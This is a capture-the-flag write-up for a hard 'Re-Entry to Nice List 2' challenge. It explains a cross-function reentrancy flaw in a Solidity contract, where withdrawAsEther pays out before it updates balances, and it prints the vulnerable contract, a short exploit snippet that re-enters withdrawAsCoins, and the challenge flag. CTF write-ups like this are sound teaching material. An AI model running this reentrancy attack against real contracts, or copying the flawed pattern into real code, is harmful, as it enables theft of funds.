# 19 - Re-Entry to Nice List 2

## Description

Level: Hard<br/>
Author: HaCk0

The elves are going web3! Again...

After last years failure where everybody could enter the nice list even seconds before christmas, Santa tasked his elves
months before this years event to have finally a buy-in nice list that is also secure. To get the most value out of this
endavour, they also created a new crypto currency with their own chain :O The chain is called SantasShackles and the
coin is called SANTA.

Try to enter the nice list and get the flag!

## Solution

For this challenge we are given two smart contracts written in solidity. The relevant parts of the challenge source are:

```
contract NiceListV2 {
    uint128 public buyInAmount;
    uint64 public christmasTimestamp;
    uint8 public unlocked = 1;
    SantaCoin public santaCoin;

    mapping(address => uint256) public buyIns;
    mapping(address => uint256) public niceListV2;

    modifier nonReentrant() {
        require(unlocked == 1, "Reentrancy");
        unlocked = 2;
        _;
        unlocked = 1;
    }

    function buyIn(uint256 amount) external {
        bool success = santaCoin.transferFrom(msg.sender, address(this), amount);

        if (!success) {
            revert TransferFailed(msg.sender, address(this), amount);
        }

        _buyIn(msg.sender, amount);
    }

    function _buyIn(address user, uint256 amount) private {
        uint256 userBuyInAmount = buyIns[user] + amount;

        if (userBuyInAmount > buyInAmount - 1 && niceListV2[user] != christmasTimestamp) {
            niceListV2[user] = christmasTimestamp;
            userBuyInAmount -= buyInAmount;
        }

        buyIns[user] = userBuyInAmount;
    }

    function isNice(address user) external view returns (bool) {
        return niceListV2[user] == christmasTimestamp;
    }

    function withdrawAsCoins(uint256 amount) external {
        if (amount == 0) {
            revert WithdrawFailed("Amount is 0");
        }

        uint256 userBuyIn = buyIns[msg.sender];

        if (userBuyIn < amount) {
            revert NotEnoughFunds(amount, userBuyIn);
        }

        santaCoin.transfer(msg.sender, amount);
        buyIns[msg.sender] = userBuyIn - amount;
    }

    function withdrawAsEther(uint256 amount) external nonReentrant {
        if (amount == 0) {
            revert WithdrawFailed("Amount is 0");
        }

        uint256 userBuyIn = buyIns[msg.sender];
        if (userBuyIn < amount) {
            revert NotEnoughFunds(amount, userBuyIn);
        }

        santaCoin.sellCoins(amount);
        (bool success, ) = payable(msg.sender).call{value: amount}("");

        if (!success) {
            revert WithdrawFailed("External call failed");
        }

        buyIns[msg.sender] = userBuyIn - amount;
        emit UserWithdraw(msg.sender, amount, true);
    }
}
```

The goal of the challenge is to obtain 100 SANTA (1 SANTA = 1 ETH) to buy ourselves a spot on the nice list. Based on
the challenge title, we can assume that we achieve this goal through some kind of re-entry vulnerability. Clearly,
`withdrawAsEther` is protected against re-entry. But if we look at the functions `withdrawAsCoins` and `withdrawAsEther`
together, there is a re-entry vulnerability. The attack is quite simple:

```
function attack() external payable  {
    niceList.buyIn(balance);
    niceList.withdrawAsEther(balance);
}

receive() external payable{
    niceList.withdrawAsCoins(balance);
}
```

With this I'm able to withdraw the coins twice from the smart contract and eventually obtain 100 ETH. I wrote the attack
such that it doubled the buy in in each iteration and then executed the attacks manually. This requied a total of
7 transactions but eventually I could get the flag: `HV22{__N1c3__You__ARe__Ind33d__}`.
